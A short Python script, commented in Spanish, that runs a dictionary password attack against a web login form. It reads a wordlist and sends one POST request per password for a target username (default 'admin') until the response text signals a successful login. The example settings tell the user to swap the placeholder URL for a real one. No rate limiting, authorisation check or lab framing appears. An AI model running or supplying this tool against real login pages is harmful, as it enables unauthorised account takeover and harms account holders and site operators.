import requests

def probar_contraseñas(url, archivo_contraseñas, campo_usuario, campo_contraseña, usuario):
    """
    Función para probar contraseñas mediante solicitudes POST
    
    Args:
        url (str): URL del endpoint de login
        archivo_contraseñas (str): Ruta al archivo con contraseñas
        campo_usuario (str): Nombre del campo de usuario en el formulario
        campo_contraseña (str): Nombre del campo de contraseña en el formulario
        usuario (str): Nombre de usuario a probar
    """
    
    # Leer las contraseñas del archivo
    try:
        with open(archivo_contraseñas, 'r') as f:
            contraseñas = f.read().splitlines()
    except FileNotFoundError:
        print(f"Error: No se encontró el archivo {archivo_contraseñas}")
        return
    
    print(f"\nProbando {len(contraseñas)} contraseñas contra {url}\n")
    
    # Probar cada contraseña
    for contraseña in contraseñas:
        # Crear los datos para el POST
        datos = {
            campo_usuario: usuario,
            campo_contraseña: contraseña
        }
        
        try:
            # Enviar la solicitud POST
            respuesta = requests.post(url, data=datos)
            
            # Verificar si el login fue exitoso (esto depende de la respuesta del servidor)
            if respuesta.status_code == 200 and "login exitoso" in respuesta.text.lower():
                print(f"¡Éxito! Contraseña encontrada: {contraseña}")
                return
            else:
                print(f"Fallo con contraseña: {contraseña}")
                
        except requests.RequestException as e:
            print(f"Error al conectar con {url}: {e}")
            return
    
    print("\nNo se encontró ninguna contraseña válida.")

# Ejemplo de uso
if __name__ == "__main__":
    # Configuración (debes ajustar estos valores)
    URL_LOGIN = "https://ejemplo.com/login"  # Reemplaza con la URL real
    ARCHIVO_CONTRASEÑAS = "contraseñas.txt"
    CAMPO_USUARIO = "username"  # Nombre del campo de usuario en el formulario
    CAMPO_CONTRASEÑA = "password"  # Nombre del campo de contraseña en el formulario
    USUARIO = "admin"  # Usuario a probar
    
    # Ejecutar el probador de contraseñas
    probar_contraseñas(URL_LOGIN, ARCHIVO_CONTRASEÑAS, CAMPO_USUARIO, CAMPO_CONTRASEÑA, USUARIO)